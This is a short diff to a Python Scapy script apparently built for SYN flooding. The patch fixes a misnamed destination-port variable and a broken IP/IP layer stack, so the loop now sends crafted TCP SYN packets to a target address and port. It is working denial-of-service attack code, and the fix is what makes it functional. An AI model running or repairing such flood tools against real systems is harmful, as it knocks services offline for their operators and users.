@@ -29,12 +29,12 @@ def SYN_Flood(dstIP,dstPort,counter):
 
         TCP_Packet = TCP ()
         TCP_Packet.sport = s_port
-        TCP_Packet.dport = dst_Port
+        TCP_Packet.dport = dstPort
         TCP_Packet.flags = "S"
         TCP_Packet.seq = s_eq
         TCP_Packet.window = w_indow
 
-        send(IP_Packet/IP_Packet, verbose=0)
+        send(IP_Packet/TCP_Packet, verbose=0)
         total+=1
     sys.stdout.write("\nTotal packets sent: %i\n" % total)
 
